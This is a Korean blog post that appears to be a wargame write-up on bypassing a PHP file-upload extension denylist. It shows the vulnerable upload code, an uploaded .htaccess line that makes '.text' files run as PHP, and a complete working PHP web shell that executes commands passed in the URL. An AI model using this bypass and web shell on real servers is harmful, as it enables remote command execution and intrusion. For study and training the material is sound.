---
title: "[2025-07-27] Apache htaccess"
excerpt: "File Vulnerability advanced"

categories:
  - Problem
tags:
  - [File Vulnerability]

permalink: /Problem/[2025-07-27] Apache htaccess/

toc: true
toc_sticky: true

date: 2025-07-27
last_modified_at: 2025-07-27
---

## 🦥 본문

- index.php

```python
<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
        <div class="card-content">
        <h1 class="title">Online File Box</h1>
        <form action="upload.php" method="post" enctype="multipart/form-data">
            <div class="field">
                <div id="file-js" class="file has-name">
                    <label class="file-label">
                        <input class="file-input" type="file" name="file">
                        <span class="file-cta">
                            <span class="file-label">Choose a file...</span>
                        </span>
                        <span class="file-name">No file uploaded</span>
                    </label>
                </div>
            </div>
            <div class="control">
                <input class="button is-success" type="submit" value="submit">
            </div>
        </form>
        </div>
        </div>
        <script>
            const fileInput = document.querySelector('#file-js input[type=file]');
            fileInput.onchange = () => {
                if (fileInput.files.length > 0) {
                const fileName = document.querySelector('#file-js .file-name');
                fileName.textContent = fileInput.files[0].name;
                }
            }
        </script>
    </body>
</html>
```

위의 코드는 `<input type=”file”>` 변경을 감지하여 `.file-name` 요소에 파일 이름을 표시하는 코드이다. 즉, 사용자가 업로드할 파일을 선택하면 파일 이름을 화면에 표시한다.

- upload.php

```python
<?php
$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml");

if (isset($_FILES)) {
    $file = $_FILES["file"];
    $error = $file["error"];
    $name = $file["name"];
    $tmp_name = $file["tmp_name"];
   
    if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
    }else {
        $temp = explode(".", $name);
        $extension = end($temp);
       
        if(in_array($extension, $deniedExts)){
            die($extension . " extension file is not allowed to upload ! ");
        }else{
            move_uploaded_file($tmp_name, "upload/" . $name);
            echo "Stored in: <a href='/upload/{$name}'>/upload/{$name}</a>";
        }
    }
}else {
    echo "File is not selected";
}
?>
```

위의 코드는 파일을 업로드했을 때 작동하는 코드이다. 

`<input type=”file”>` 에서 정보를 가져온다.

- $file은 해당 파일 정보들
- $file["error"]는 업로드 도중 발생한 에러 코드
- $file["name"]는 파일명
- $file["tmp_name"]는 파일이 임시로 저장한 파일 경로

explode()를 통해 `.` 를 구분하여 쪼개고 마지막 부분이 확장자가 된다. 확장자가 필터링을 통과하면 제대로 저장이 되고 저장된 위치를 이용자에게 보내준다. 즉, 필터링을 우회해야 한다.

제목 처럼 .htaccess 파일을 이용해야 한다. 해당 .htaccess를 덮어씌워서 확장자를 우회해야 한다.

### 풀이

1. .htaccess 파일을 만든다.
    
    ```python
    ADDType application/x-httpd-php .text
    ```
    
    - text 파일을 php 파일로 인식하게 한다.
2. .htaccess를 업로드 하여 위와 같은 코드를 설정한다
3. 웹셸 코드를 text 형태로 업로드한다
    - hack.text
    
    ```python
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }
    ?>
    </pre>
    </body>
    </html>
    ```
    
4. 설치된 주소로 들어가서 웹셸을 실행시키고 flag를 획득한다.